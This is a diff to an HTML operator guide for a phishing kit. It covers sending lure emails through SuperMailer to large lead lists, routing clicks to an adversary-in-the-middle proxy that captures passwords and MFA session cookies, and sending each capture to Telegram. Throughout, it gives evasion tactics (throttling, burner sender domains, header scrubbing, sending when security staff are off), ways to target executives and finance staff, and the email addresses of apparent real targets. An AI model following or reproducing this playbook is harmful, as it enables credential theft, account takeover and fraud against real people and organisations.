@@ -310,23 +310,25 @@
 
 <h2>1. Overview</h2>
 
-<p>Supermailer (Professional Unlimited BCC license) is the email delivery engine for the GLNT Phish Kit. It sends HTML lure emails to target lists with per-recipient personalization via BCC mode, tracks opens/clicks/bounces, and handles throttling.</p>
+<p>Supermailer (Professional Unlimited BCC license) is the email delivery engine for the GLNT Phish Kit. It sends HTML lure emails to target lists via BCC mode (identical content to all recipients with generic greeting defaults), tracks opens/clicks/bounces, and handles throttling.</p>
 
 <p><strong>Pipeline position:</strong></p>
 
 <pre><code>Lead CSV (glnt-data/leads/*.csv)
-  → build-campaign-email.sh (fills {LINK} + {RECIPIENT_NAME} into template)
-  → SuperMailer (SMTP send with throttling, BCC, tracking)
-  → Recipient inbox → clicks link → glnt.cc → AiTM proxy → credentials captured
-  → Telegram alert + analytics dashboard</code></pre>
+  &rarr; build-campaign-email.sh (fills {LINK} into template; {RECIPIENT_NAME} defaults to "Colleague" for BCC)
+  &rarr; SuperMailer (SMTP send with throttling, BCC, tracking &mdash; identical content to all recipients)
+  &rarr; Recipient inbox &rarr; clicks link &rarr; glnt.cc &rarr; AiTM proxy &rarr; credentials captured
+  &rarr; Telegram alert + analytics dashboard</code></pre>
 
 <p><strong>Key paths:</strong> <code>scripts/build-campaign-email.sh</code> (link insertion), <code>lures/*.html</code> (10 body lures with <code>{LINK}</code>/<code>{RECIPIENT_NAME}</code>), <code>lures/attachments/*.html</code> (10 attachment lures with <code>{LINK}</code>/<code>##victimemail##</code>/<code>{SENDER_ORG}</code>), <code>~/glnt-data/leads/</code> (113K+ verified CSVs), <code>CURRENT_LINK.txt</code> (active phishing URL).</p>
+
+<div class="note"><strong>Note:</strong> BCC mode sends identical content to all recipients. Body lures use a generic greeting (default: "Colleague"). <code>{RECIPIENT_NAME}</code> is substituted at build time with a generic value &mdash; per-recipient name substitution is not possible in BCC mode.</div>
 
 <h2>2. SuperMailer Setup</h2>
 
 <h3>2.1 SMTP Configuration</h3>
 
-<p>SuperMailer → <strong>Settings</strong> → <strong>SMTP Server</strong> → Add new profile:</p>
+<p>SuperMailer &rarr; <strong>Settings</strong> &rarr; <strong>SMTP Server</strong> &rarr; Add new profile:</p>
 
 <pre><code>SMTP Host:       smtp.your-relay.com
 Port:            587
@@ -343,8 +345,8 @@ Password:        &lt;your-smtp-password&gt;</code></pre>
   <thead><tr><th>Setting</th><th>Value</th><th>Rationale</th></tr></thead>
   <tbody>
     <tr><td>Port</td><td>587</td><td>Standard submission port, universally accepted</td></tr>
-    <tr><td>Encryption</td><td>STARTTLS</td><td>Opportunistic TLS — works with nearly all relays</td></tr>
-    <tr><td>Max emails/hr</td><td>50–100</td><td>Stay below commercial spam thresholds</td></tr>
+    <tr><td>Encryption</td><td>STARTTLS</td><td>Opportunistic TLS &mdash; works with nearly all relays</td></tr>
+    <tr><td>Max emails/hr</td><td>50&ndash;100</td><td>Stay below commercial spam thresholds</td></tr>
     <tr><td>Max emails/connection</td><td>25</td><td>Limits connection reuse, reduces greylisting</td></tr>
     <tr><td>Connection timeout</td><td>30s</td><td>Long enough for slow relays, short enough to fail fast</td></tr>
     <tr><td>Max retries</td><td>2</td><td>Two soft-bounce retries before hard-failing</td></tr>
@@ -352,7 +354,7 @@ Password:        &lt;your-smtp-password&gt;</code></pre>
   </tbody>
 </table>
 
-<p>If SMTP auth fails: (1) verify credentials — some relays require full email as username, (2) check IP whitelisting requirements, (3) try port 25 as fallback.</p>
+<p>If SMTP auth fails: (1) verify credentials &mdash; some relays require full email as username, (2) check IP whitelisting requirements, (3) try port 25 as fallback.</p>
 
 <h3>2.2 DKIM, SPF, DMARC</h3>
 
@@ -373,7 +375,7 @@ Password:        &lt;your-smtp-password&gt;</code></pre>
 <h3>2.3 Throttle Settings</h3>
 
 <div class="step">
-  <p><strong>Settings</strong> → <strong>SMTP Server</strong> → select profile</p>
+  <p><strong>Settings</strong> &rarr; <strong>SMTP Server</strong> &rarr; select profile</p>
 </div>
 <div class="step">
   <p><strong>Max emails per hour:</strong> 50 (warm-up) / 100 (operating)</p>
@@ -382,14 +384,14 @@ Password:        &lt;your-smtp-password&gt;</code></pre>
   <p><strong>Max emails per connection:</strong> 25</p>
 </div>
 <div class="step">
-  <p><strong>Enable random delay:</strong> 5–15 seconds between sends</p>
+  <p><strong>Enable random delay:</strong> 5&ndash;15 seconds between sends</p>
 </div>
 
 <div class="note"><strong>Throttle rationale:</strong> 50/hr looks like normal business traffic. 500/hr looks like a mail merge. 5,000/hr looks like a spam run and will be blocked within minutes.</div>
 
 <h3>2.4 Test Mode</h3>
 
-<p>Before any campaign: <strong>Campaign</strong> → <strong>Send Test</strong> → your personal Gmail and Outlook addresses. Verify rendering, link clickability, and spam placement. Also use the <strong>Simulate</strong> button (runs campaign logic without sending) to verify merge field substitution.</p>
+<p>Before any campaign: <strong>Campaign</strong> &rarr; <strong>Send Test</strong> &rarr; your personal Gmail and Outlook addresses. Verify rendering, link clickability, and spam placement. Also use the <strong>Simulate</strong> button (runs campaign logic without sending) to verify merge field substitution.</p>
 
 <h2>3. Link Lure Workflow</h2>
 
@@ -400,53 +402,52 @@ Password:        &lt;your-smtp-password&gt;</code></pre>
 ./scripts/build-campaign-email.sh \
   shared-document \
   "https://glnt.cc/#&lt;encrypted-fragment&gt;" \
-  "{FirstName}" \
   /tmp/campaign-email.html</code></pre>
 
 <p><strong>Arguments:</strong></p>
 
 <table>
-  <thead><tr><th>Arg</th><th>Description</th><th>Example</th></tr></thead>
+  <thead><tr><th>Arg</th><th>Description</th><th>Required</th><th>Example</th></tr></thead>
   <tbody>
-    <tr><td><code>$1</code></td><td>Lure template name (without <code>.html</code>)</td><td><code>shared-document</code></td></tr>
-    <tr><td><code>$2</code></td><td>Full phishing URL with encrypted fragment</td><td><code>https://glnt.cc/#abc123...</code></td></tr>
-    <tr><td><code>$3</code></td><td>SuperMailer merge field for recipient name</td><td><code>{FirstName}</code></td></tr>
-    <tr><td><code>$4</code></td><td>Output file path</td><td><code>/tmp/campaign-email.html</code></td></tr>
+    <tr><td><code>$1</code></td><td>Lure template name (without <code>.html</code>)</td><td>Yes</td><td><code>shared-document</code></td></tr>
+    <tr><td><code>$2</code></td><td>Full phishing URL with encrypted fragment</td><td>Yes</td><td><code>https://glnt.cc/#abc123...</code></td></tr>
+    <tr><td><code>$3</code></td><td>Greeting name for the email (defaults to "Colleague")</td><td>No</td><td><code>Colleague</code></td></tr>
+    <tr><td><code>$4</code></td><td>Output file path</td><td>No (defaults to <code>campaign-email.html</code>)</td><td><code>/tmp/campaign-email.html</code></td></tr>
   </tbody>
 </table>
 
 <h3>3.2 How Placeholders Work</h3>
 
 <p>The script runs:</p>
-<pre><code>sed "s|{LINK}|${LINK}|g; s|{RECIPIENT_NAME}|${NAME}|g" "$LURE_FILE" > "$OUTPUT"</code></pre>
+<pre><code>sed "s|{LINK}|${LINK}|g; s|{RECIPIENT_NAME}|${NAME}|g" "$LURE_FILE" &gt; "$OUTPUT"</code></pre>
 
-<pre><code>{LINK}              →  phishing URL (e.g., https://glnt.cc/#...)
-{RECIPIENT_NAME}    →  SuperMailer merge field (e.g., {FirstName})</code></pre>
+<pre><code>{LINK}              &rarr;  phishing URL (e.g., https://glnt.cc/#...)
+{RECIPIENT_NAME}    &rarr;  generic greeting (defaults to "Colleague")</code></pre>
 
-<div class="note"><strong>Critical detail:</strong> The greeting is <code>Hello{RECIPIENT_NAME},</code> (no space). SuperMailer substitutes <code>{FirstName}</code> → "Dirk" yielding "HelloDirk,". The template omits the space intentionally so it doesn't appear before the comma. To add a space, edit the lure to <code>Hello {RECIPIENT_NAME},</code> before building.</div>
+<div class="note"><strong>Critical detail:</strong> In BCC mode, the greeting is the same for all recipients. The script defaults <code>--name</code> to "Colleague" when omitted, producing greetings like "Hello Colleague,". This is a limitation of BCC mass-send &mdash; identical content goes to every recipient. Per-recipient name personalization is not possible in this mode.</div>
 
 <h3>3.3 Paste into SuperMailer</h3>
 
 <div class="step">
-  <p>SuperMailer → <strong>Campaign</strong> → <strong>New Campaign</strong> → name it (e.g., <code>spring-phish-001-addus</code>)</p>
+  <p>SuperMailer &rarr; <strong>Campaign</strong> &rarr; <strong>New Campaign</strong> &rarr; name it (e.g., <code>spring-phish-001-addus</code>)</p>
 </div>
 <div class="step">
-  <p><strong>Message</strong> tab → click <strong>HTML Source</strong> (the <code>&lt;&gt;</code> icon)</p>
+  <p><strong>Message</strong> tab &rarr; click <strong>HTML Source</strong> (the <code>&lt;&gt;</code> icon)</p>
 </div>
 <div class="step">
-  <p>Open the built email in a text editor → <strong>Select All</strong> → <strong>Copy</strong></p>
+  <p>Open the built email in a text editor &rarr; <strong>Select All</strong> &rarr; <strong>Copy</strong></p>
 </div>
 <div class="step">
-  <p><strong>Paste</strong> entire contents into HTML Source view → click <strong>Apply</strong></p>
+  <p><strong>Paste</strong> entire contents into HTML Source view &rarr; click <strong>Apply</strong></p>
 </div>
 <div class="step">
   <p>Verify the HTML preview: button, document details, footer all render correctly</p>
 </div>
 <div class="step">
-  <p>Check <strong>Text</strong> tab — confirm auto-generated plain-text fallback reads naturally</p>
+  <p>Check <strong>Text</strong> tab &mdash; confirm auto-generated plain-text fallback reads naturally</p>
 </div>
 <div class="step">
-  <p>Check <strong>Attachments</strong> tab — inline HTML lures should have zero attachments</p>
+  <p>Check <strong>Attachments</strong> tab &mdash; inline HTML lures should have zero attachments</p>
 </div>
 
 <h3>3.4 Configure Sender Identity</h3>
@@ -457,19 +458,17 @@ Password:        &lt;your-smtp-password&gt;</code></pre>
     <tr><td><strong>From Name</strong></td><td>Match the lure theme</td><td>"Secure Document Portal", "IT Support", "HR Department"</td></tr>
     <tr><td><strong>From Email</strong></td><td>Matching sender address</td><td><code>documents@portal-verify.com</code></td></tr>
     <tr><td><strong>Reply-To</strong></td><td>Same as From Email</td><td>Replies land in a monitored inbox</td></tr>
-    <tr><td><strong>Return-Path</strong></td><td>Bounce-handling address</td><td><code>bounces@your-relay.com</code> — separate from sender</td></tr>
+    <tr><td><strong>Return-Path</strong></td><td>Bounce-handling address</td><td><code>bounces@your-relay.com</code> &mdash; separate from sender</td></tr>
   </tbody>
 </table>
 
-<div class="warn"><strong>Sender domain must not be your phishing domain</strong> (e.g., <code>glnt.cc</code>). Use a separate domain with valid SPF/DKIM/DMARC. Burn sender domains between campaigns — never reuse across targets.</div>
+<div class="warn"><strong>Sender domain must not be your phishing domain</strong> (e.g., <code>glnt.cc</code>). Use a separate domain with valid SPF/DKIM/DMARC. Burn sender domains between campaigns &mdash; never reuse across targets.</div>
 
 <h3>3.5 BCC Mode</h3>
 
-<div class="margin-note">BCC mode sends each email individually with per-recipient merge field substitution.</div>
+<p>SuperMailer's BCC mode sends the identical email content to every recipient. The <code>{RECIPIENT_NAME}</code> placeholder is substituted at build time with a generic value (defaults to "Colleague"). All recipients see the same greeting, e.g., "Hello Colleague,".</p>
 
-<p>SuperMailer's BCC mode sends each email individually. <code>{FirstName}</code> is substituted with the actual name from your lead list. The recipient sees "Hello Dirk," not "Hello Colleague,". Personalization increases open rates 30–50%.</p>
-
-<p>Do NOT use <code>##victimemail##</code> in body lures — that placeholder is only for attachment lures (Section 4).</p>
+<p>Do NOT use <code>##victimemail##</code> in body lures &mdash; that placeholder is only for attachment lures (Section 4).</p>
 
 <h2>4. Attachment Lure Workflow</h2>
 
@@ -499,41 +498,41 @@ Password:        &lt;your-smtp-password&gt;</code></pre>
 
 <p>Attachment lures use three placeholders:</p>
 
-<pre><code>{LINK}              →  phishing URL (same as body lures)
-##victimemail##     →  recipient's email address, displayed in the attachment body
-{SENDER_ORG}        →  sender's organization name (e.g., "Fidelity Investments")</code></pre>
+<pre><code>{LINK}              &rarr;  phishing URL (same as body lures)
+##victimemail##     &rarr;  generic email reference (e.g., "your email address") &mdash; in BCC mode this cannot be per-recipient
+{SENDER_ORG}        &rarr;  sender's organization name (e.g., "Fidelity Investments")</code></pre>
 
-<p>Example from DocuSign: "Sign-in authentication with <strong>dirk.allison@addus.com</strong> is required to access the document." The <code>##victimemail##</code> placeholder makes the attachment feel authentic by already "knowing" the recipient's email.</p>
+<div class="note"><strong>Note:</strong> In BCC mode, the same attachment content is delivered to all recipients. The <code>##victimemail##</code> placeholder should be replaced with a generic phrase like "your email address" or "your account" since per-recipient personalization is not possible.</div>
 
 <h3>4.3 Building an Attachment Lure</h3>
 
-<p><code>build-campaign-email.sh</code> only handles <code>{LINK}</code> and <code>{RECIPIENT_NAME}</code>. For attachment lures, use manual sed:</p>
+<p><code>build-campaign-email.sh</code> only handles <code>{LINK}</code> and <code>{RECIPIENT_NAME}</code>. For attachment lures, use manual sed with generic placeholders (BCC mode cannot use per-recipient merge fields):</p>
 
 <pre><code>LINK="https://glnt.cc/#&lt;encrypted-fragment&gt;"
-sed "s|{LINK}|${LINK}|g; s|##victimemail##|{Email}|g; s|{SENDER_ORG}|{Company}|g" \
-  lures/attachments/docusign-wire.html > /tmp/docusign-attachment.html</code></pre>
+sed "s|{LINK}|${LINK}|g; s|##victimemail##|your email address|g; s|{SENDER_ORG}|your organization|g" \
+  lures/attachments/docusign-wire.html &gt; /tmp/docusign-attachment.html</code></pre>
 
 <p>This maps:</p>
-<p>&#x2022; <code>##victimemail##</code> → <code>{Email}</code> (SuperMailer merge field)</p>
-<p>&#x2022; <code>{SENDER_ORG}</code> → <code>{Company}</code> (SuperMailer merge field from lead CSV <code>company</code> column)</p>
+<p>&#x2022; <code>##victimemail##</code> &rarr; generic phrase (e.g., "your email address") &mdash; BCC limitation</p>
+<p>&#x2022; <code>{SENDER_ORG}</code> &rarr; generic phrase (e.g., "your organization") &mdash; BCC limitation</p>
 
 <h3>4.4 Sending in SuperMailer</h3>
 
 <div class="step">
-  <p><strong>Campaign</strong> → <strong>New Campaign</strong> → name it</p>
+  <p><strong>Campaign</strong> &rarr; <strong>New Campaign</strong> &rarr; name it</p>
 </div>
 <div class="step">
-  <p><strong>Message</strong> tab → write a short plain-text email body (2–3 sentences):</p>
+  <p><strong>Message</strong> tab &rarr; write a short plain-text email body (2&ndash;3 sentences):</p>
   <p>"Please find the attached document. Let me know if you have any questions."</p>
 </div>
 <div class="step">
-  <p>Do NOT paste HTML into the body — body is plain text for attachment campaigns</p>
+  <p>Do NOT paste HTML into the body &mdash; body is plain text for attachment campaigns</p>
 </div>
 <div class="step">
-  <p>Click <strong>Attach File</strong> → browse to your built attachment HTML</p>
+  <p>Click <strong>Attach File</strong> &rarr; browse to your built attachment HTML</p>
 </div>
 <div class="step">
-  <p>Rename the file before attaching: <code>docusign-wire.html</code> → <code>Document_Review.html</code> (innocent name, keep <code>.html</code> extension)</p>
+  <p>Rename the file before attaching: <code>docusign-wire.html</code> &rarr; <code>Document_Review.html</code> (innocent name, keep <code>.html</code> extension)</p>
 </div>
 <div class="step">
   <p>Set <strong>From Name</strong> to match the brand (e.g., "DocuSign", "Microsoft Teams")</p>
@@ -548,7 +547,7 @@ sed "s|{LINK}|${LINK}|g; s|##victimemail##|{Email}|g; s|{SENDER_ORG}|{Company}|g
   <p><strong>Send Test</strong> to yourself</p>
 </div>
 <div class="step">
-  <p>Open in Gmail and Outlook — download and open the <code>.html</code> attachment</p>
+  <p>Open in Gmail and Outlook &mdash; download and open the <code>.html</code> attachment</p>
 </div>
 <div class="step">
   <p>Verify rendering (logos, colors, button) and click the link to confirm proxy routing</p>
@@ -571,8 +570,8 @@ abigail.johnson@fidelity.com,Abigail,Johnson,fidelity.com,first.last,Executive,F
 <table>
   <thead><tr><th>CSV Column</th><th>SuperMailer Field</th><th>Purpose</th></tr></thead>
   <tbody>
-    <tr><td><code>email</code></td><td><code>{Email}</code></td><td>Recipient address — required</td></tr>
-    <tr><td><code>first</code></td><td><code>{FirstName}</code></td><td>First name for greeting personalization</td></tr>
+    <tr><td><code>email</code></td><td><code>{Email}</code></td><td>Recipient address &mdash; required</td></tr>
+    <tr><td><code>first</code></td><td><code>{FirstName}</code></td><td>First name (informational only in BCC mode &mdash; greeting is generic)</td></tr>
     <tr><td><code>last</code></td><td><code>{LastName}</code></td><td>Last name (optional)</td></tr>
     <tr><td><code>company</code></td><td><code>{Company}</code></td><td>Organization name for <code>{SENDER_ORG}</code> in attachment lures</td></tr>
   </tbody>
@@ -581,38 +580,38 @@ abigail.johnson@fidelity.com,Abigail,Johnson,fidelity.com,first.last,Executive,F
 <h3>5.2 Import Steps</h3>
 
 <div class="step">
-  <p>SuperMailer → <strong>Recipients</strong> → <strong>Import</strong> → <strong>CSV File</strong></p>
+  <p>SuperMailer &rarr; <strong>Recipients</strong> &rarr; <strong>Import</strong> &rarr; <strong>CSV File</strong></p>
 </div>
 <div class="step">
   <p>Select target CSV from <code>~/glnt-data/leads/</code></p>
 </div>
 <div class="step">
-  <p>Map columns: <code>email</code> → Email, <code>first</code> → FirstName, <code>last</code> → LastName, <code>company</code> → Custom field: Company</p>
+  <p>Map columns: <code>email</code> &rarr; Email, <code>first</code> &rarr; FirstName, <code>last</code> &rarr; LastName, <code>company</code> &rarr; Custom field: Company</p>
 </div>
 <div class="step">
   <p>Uncheck all other columns (<code>domain</code>, <code>pattern</code>, <code>department</code>, <code>title</code>, <code>verified</code>, <code>mx</code>, metadata)</p>
 </div>
 <div class="step">
-  <p>Enable <strong>Deduplicate</strong> → by <strong>Email address</strong></p>
+  <p>Enable <strong>Deduplicate</strong> &rarr; by <strong>Email address</strong></p>
 </div>
 <div class="step">
   <p>Assign to a <strong>Group</strong> named after the campaign (e.g., <code>spring-phish-001-addus</code>)</p>
 </div>
 <div class="step">
-  <p>Click <strong>Import</strong> → verify recipient count matches <code>wc -l &lt;csv-file&gt;</code></p>
+  <p>Click <strong>Import</strong> &rarr; verify recipient count matches <code>wc -l &lt;csv-file&gt;</code></p>
 </div>
 
 <h3>5.3 Filtering Before Import</h3>
 
 <pre><code># MX-verified only (higher deliverability)
-grep ',mx_valid,' ~/glnt-data/leads/master_leads_verified.csv > /tmp/mx_valid_leads.csv
+grep ',mx_valid,' ~/glnt-data/leads/master_leads_verified.csv &gt; /tmp/mx_valid_leads.csv
 
 # Executives only
-grep -iE 'CEO|CFO|CIO|CTO|COO|President|Director|VP' ~/glnt-data/leads/master_leads_verified.csv > /tmp/executive_leads.csv
+grep -iE 'CEO|CFO|CIO|CTO|COO|President|Director|VP' ~/glnt-data/leads/master_leads_verified.csv &gt; /tmp/executive_leads.csv
 
 # By company or department
-grep 'Fidelity' ~/glnt-data/leads/master_leads_verified.csv > /tmp/fidelity_leads.csv
-grep -iE 'Finance|Accounting|Treasury' ~/glnt-data/leads/master_leads_verified.csv > /tmp/finance_leads.csv</code></pre>
+grep 'Fidelity' ~/glnt-data/leads/master_leads_verified.csv &gt; /tmp/fidelity_leads.csv
+grep -iE 'Finance|Accounting|Treasury' ~/glnt-data/leads/master_leads_verified.csv &gt; /tmp/finance_leads.csv</code></pre>
 
 <h3>5.4 Splitting Large Lists</h3>
 
@@ -627,10 +626,10 @@ split -l 5000 ~/glnt-data/leads/master_leads_verified.csv /tmp/batch_
 <table>
   <thead><tr><th>Phase</th><th>Rate</th><th>Duration</th><th>Recipients</th></tr></thead>
   <tbody>
-    <tr><td>Day 1 — Warm-up</td><td>10/hr</td><td>Full day</td><td>~80</td></tr>
-    <tr><td>Day 2 — Ramp</td><td>25/hr</td><td>Full day</td><td>~200</td></tr>
-    <tr><td>Day 3 — Ramp</td><td>50/hr</td><td>Full day</td><td>~400</td></tr>
-    <tr><td>Day 4+ — Full send</td><td>100/hr</td><td>Until done</td><td>Remaining</td></tr>
+    <tr><td>Day 1 &mdash; Warm-up</td><td>10/hr</td><td>Full day</td><td>~80</td></tr>
+    <tr><td>Day 2 &mdash; Ramp</td><td>25/hr</td><td>Full day</td><td>~200</td></tr>
+    <tr><td>Day 3 &mdash; Ramp</td><td>50/hr</td><td>Full day</td><td>~400</td></tr>
+    <tr><td>Day 4+ &mdash; Full send</td><td>100/hr</td><td>Until done</td><td>Remaining</td></tr>
   </tbody>
 </table>
 
@@ -638,12 +637,12 @@ split -l 5000 ~/glnt-data/leads/master_leads_verified.csv /tmp/batch_
 
 <h3>6.2 Send Windows</h3>
 
-<p>&#x2022; <strong>Tuesday through Thursday</strong> — Mon/Fri have lower engagement<br>
-&#x2022; <strong>9:00–11:00 AM target timezone</strong> — people check email after arriving, before meetings<br>
-&#x2022; <strong>Avoid weekends</strong> — business lures on Saturday are suspicious<br>
-&#x2022; <strong>Avoid holidays</strong> — inboxes are ignored and security teams are off</p>
+<p>&#x2022; <strong>Tuesday through Thursday</strong> &mdash; Mon/Fri have lower engagement<br>
+&#x2022; <strong>9:00&ndash;11:00 AM target timezone</strong> &mdash; people check email after arriving, before meetings<br>
+&#x2022; <strong>Avoid weekends</strong> &mdash; business lures on Saturday are suspicious<br>
+&#x2022; <strong>Avoid holidays</strong> &mdash; inboxes are ignored and security teams are off</p>
 
-<p>Use SuperMailer's <strong>Scheduler</strong> (Campaign → Schedule) to launch at 9:00 AM target timezone.</p>
+<p>Use SuperMailer's <strong>Scheduler</strong> (Campaign &rarr; Schedule) to launch at 9:00 AM target timezone.</p>
 
 <h3>6.3 Batch Sizes and Per-Domain Throttling</h3>
 
@@ -663,20 +662,20 @@ split -l 5000 ~/glnt-data/leads/master_leads_verified.csv /tmp/batch_
 
 <p>Split lead lists by recipient domain and send campaigns sequentially:</p>
 
-<pre><code>grep '@addus.com$' ~/glnt-data/leads/master_leads_verified.csv > /tmp/addus_leads.csv
-grep '@fidelity.com$' ~/glnt-data/leads/master_leads_verified.csv > /tmp/fidelity_leads.csv
+<pre><code>grep '@addus.com$' ~/glnt-data/leads/master_leads_verified.csv &gt; /tmp/addus_leads.csv
+grep '@fidelity.com$' ~/glnt-data/leads/master_leads_verified.csv &gt; /tmp/fidelity_leads.csv
 # Import separately, send sequentially</code></pre>
 
 <h3>6.4 Bounce Handling</h3>
 
-<p>SuperMailer auto-suppresses hard bounces. Monitor Campaign → <strong>Statistics</strong> → <strong>Bounces</strong> actively.</p>
+<p>SuperMailer auto-suppresses hard bounces. Monitor Campaign &rarr; <strong>Statistics</strong> &rarr; <strong>Bounces</strong> actively.</p>
 
 <table>
   <thead><tr><th>Bounce Rate</th><th>Action</th></tr></thead>
   <tbody>
-    <tr><td>&lt; 2%</td><td>Normal — continue</td></tr>
-    <tr><td>2–5%</td><td>Elevated — slow rate, monitor closely</td></tr>
-    <tr><td>&gt; 5%</td><td><strong>STOP IMMEDIATELY</strong> — reputation is deteriorating</td></tr>
+    <tr><td>&lt; 2%</td><td>Normal &mdash; continue</td></tr>
+    <tr><td>2&ndash;5%</td><td>Elevated &mdash; slow rate, monitor closely</td></tr>
+    <tr><td>&gt; 5%</td><td><strong>STOP IMMEDIATELY</strong> &mdash; reputation is deteriorating</td></tr>
   </tbody>
 </table>
 
@@ -688,19 +687,19 @@ grep '@fidelity.com$' ~/glnt-data/leads/master_leads_verified.csv > /tmp/fidelit
   <p><strong>Send Test</strong> to your Gmail and Outlook addresses</p>
 </div>
 <div class="step">
-  <p><strong>Verify rendering</strong> in Gmail (web), Outlook (desktop — Word engine), Apple Mail (iOS)</p>
+  <p><strong>Verify rendering</strong> in Gmail (web), Outlook (desktop &mdash; Word engine), Apple Mail (iOS)</p>
 </div>
 <div class="step">
-  <p><strong>Run through mail-tester.com</strong> — score must be 9/10+</p>
+  <p><strong>Run through mail-tester.com</strong> &mdash; score must be 9/10+</p>
 </div>
 <div class="step">
-  <p><strong>Verify link end-to-end:</strong> click → bootloader loads → reaches real login → complete MFA → Telegram notification</p>
+  <p><strong>Verify link end-to-end:</strong> click &rarr; bootloader loads &rarr; reaches real login &rarr; complete MFA &rarr; Telegram notification</p>
 </div>
 <div class="step">
-  <p><strong>Check raw headers</strong> (Gmail: three dots → Show Original): no phishing domain in any header, no EC2 IP in <code>Received:</code> chain, <code>Return-Path</code> points to bounce address</p>
+  <p><strong>Check raw headers</strong> (Gmail: three dots &rarr; Show Original): no phishing domain in any header, no EC2 IP in <code>Received:</code> chain, <code>Return-Path</code> points to bounce address</p>
 </div>
 
-<div class="warn"><strong>Go/No-Go checklist:</strong> mail-tester 9+/10, link resolves to real login, Telegram capture confirmed, headers clean (no phishing domain/IP leaks), renders in Gmail/Outlook/mobile, BCC personalization correct. Fix any failed check and re-test. Never skip this step.</div>
+<div class="warn"><strong>Go/No-Go checklist:</strong> mail-tester 9+/10, link resolves to real login, Telegram capture confirmed, headers clean (no phishing domain/IP leaks), renders in Gmail/Outlook/mobile, generic greeting renders correctly. Fix any failed check and re-test. Never skip this step.</div>
 
 <h2>7. Campaign Types and Lure Selection</h2>
 
@@ -709,16 +708,16 @@ grep '@fidelity.com$' ~/glnt-data/leads/master_leads_verified.csv > /tmp/fidelit
 <table>
   <thead><tr><th>Lure</th><th>Best For</th></tr></thead>
   <tbody>
-    <tr><td><code>shared-document.html</code></td><td>General document sharing — broad appeal, safe default</td></tr>
-    <tr><td><code>security-alert.html</code></td><td>Urgent security notifications — high urgency, high open rate</td></tr>
-    <tr><td><code>it-support.html</code></td><td>Password reset, account action — requires immediate action</td></tr>
-    <tr><td><code>invoice-payment.html</code></td><td>Invoice/payment notifications — targets finance staff</td></tr>
-    <tr><td><code>meeting-invite.html</code></td><td>Calendar invitations — low suspicion</td></tr>
-    <tr><td><code>voicemail-notification.html</code></td><td>Missed call/voicemail — novelty, moderate engagement</td></tr>
-    <tr><td><code>package-delivery.html</code></td><td>Shipping notifications — broad consumer appeal</td></tr>
-    <tr><td><code>hr-document.html</code></td><td>Confidential personnel docs — high curiosity</td></tr>
-    <tr><td><code>contract-signature.html</code></td><td>Contract review — targets managers/executives</td></tr>
-    <tr><td><code>expense-report.html</code></td><td>Expense report review — targets managers/approvers</td></tr>
+    <tr><td><code>shared-document.html</code></td><td>General document sharing &mdash; broad appeal, safe default</td></tr>
+    <tr><td><code>security-alert.html</code></td><td>Urgent security notifications &mdash; high urgency, high open rate</td></tr>
+    <tr><td><code>it-support.html</code></td><td>Password reset, account action &mdash; requires immediate action</td></tr>
+    <tr><td><code>invoice-payment.html</code></td><td>Invoice/payment notifications &mdash; targets finance staff</td></tr>
+    <tr><td><code>meeting-invite.html</code></td><td>Calendar invitations &mdash; low suspicion</td></tr>
+    <tr><td><code>voicemail-notification.html</code></td><td>Missed call/voicemail &mdash; novelty, moderate engagement</td></tr>
+    <tr><td><code>package-delivery.html</code></td><td>Shipping notifications &mdash; broad consumer appeal</td></tr>
+    <tr><td><code>hr-document.html</code></td><td>Confidential personnel docs &mdash; high curiosity</td></tr>
+    <tr><td><code>contract-signature.html</code></td><td>Contract review &mdash; targets managers/executives</td></tr>
+    <tr><td><code>expense-report.html</code></td><td>Expense report review &mdash; targets managers/approvers</td></tr>
   </tbody>
 </table>
 
@@ -744,7 +743,7 @@ grep '@fidelity.com$' ~/glnt-data/leads/master_leads_verified.csv > /tmp/fidelit
 
 <p><strong>Use body lures when:</strong> target org tech stack unknown, you want max deliverability (inline avoids attachment scanning), lure relies on urgency, broad mixed audience.</p>
 
-<p><strong>Use attachment lures when:</strong> you know the target platform (M365 → SharePoint/Teams/OneDrive), scenario is financial/legal/HR (attachments feel legitimate for docs), target is sophisticated, you want the lure to survive preview panes (attachments aren't rendered until opened).</p>
+<p><strong>Use attachment lures when:</strong> you know the target platform (M365 &rarr; SharePoint/Teams/OneDrive), scenario is financial/legal/HR (attachments feel legitimate for docs), target is sophisticated, you want the lure to survive preview panes (attachments aren't rendered until opened).</p>
 
 <p><strong>Matching lure to target role:</strong></p>
 
@@ -766,24 +765,24 @@ grep '@fidelity.com$' ~/glnt-data/leads/master_leads_verified.csv > /tmp/fidelit
 
 <p><code>http://&lt;EC2-IP&gt;:9092/?token=&lt;YOUR_TOKEN&gt;</code></p>
 
-<p><strong>Monitor:</strong> total events vs. SuperMailer click count (should match; gap = bootloader/proxy down), success rate (healthy: 15–30%, below 10% = proxy issue), top victim IPs (corporate IPs = right org; residential = personal devices or researchers).</p>
+<p><strong>Monitor:</strong> total events vs. SuperMailer click count (should match; gap = bootloader/proxy down), success rate (healthy: 15&ndash;30%, below 10% = proxy issue), top victim IPs (corporate IPs = right org; residential = personal devices or researchers).</p>
 
 <h3>8.2 Telegram Alerts</h3>
 
 <p>Each capture sends username, password, IP, User-Agent, timestamp, and a <code>.txt</code> attachment with session cookies and replay script.</p>
 
-<p><strong>Monitoring cadence:</strong> first hour = continuously, rest of campaign = every 30 min, post-campaign = daily for 72 hours (delayed opens peak days 2–3).</p>
+<p><strong>Monitoring cadence:</strong> first hour = continuously, rest of campaign = every 30 min, post-campaign = daily for 72 hours (delayed opens peak days 2&ndash;3).</p>
 
 <h3>8.3 Lead List Cleanup</h3>
 
-<pre><code># Export bounces from SuperMailer: Campaign → Statistics → Export Bounces
+<pre><code># Export bounces from SuperMailer: Campaign &rarr; Statistics &rarr; Export Bounces
 # Remove hard bounces from master list
 grep -v -f &lt;(cut -d',' -f1 ~/glnt-data/leads/bounces/&lt;campaign&gt;-bounces.csv) \
   ~/glnt-data/leads/master_leads_verified.csv \
-  > ~/glnt-data/leads/master_leads_verified_clean.csv
+  &gt; ~/glnt-data/leads/master_leads_verified_clean.csv
 
 # Maintain suppression list to avoid re-targeting
-echo "dirk.allison@addus.com,spring-phish-001,2026-06-23,clicked" >> ~/glnt-data/leads/suppression-list.csv</code></pre>
+echo "dirk.allison@addus.com,spring-phish-001,2026-06-23,clicked" &gt;&gt; ~/glnt-data/leads/suppression-list.csv</code></pre>
 
 <h3>8.4 Campaign Archive</h3>
 
@@ -815,7 +814,7 @@ cp /Users/sk_hga/azure-phish-kit/CURRENT_LINK.txt ~/glnt-data/campaigns/spring-p
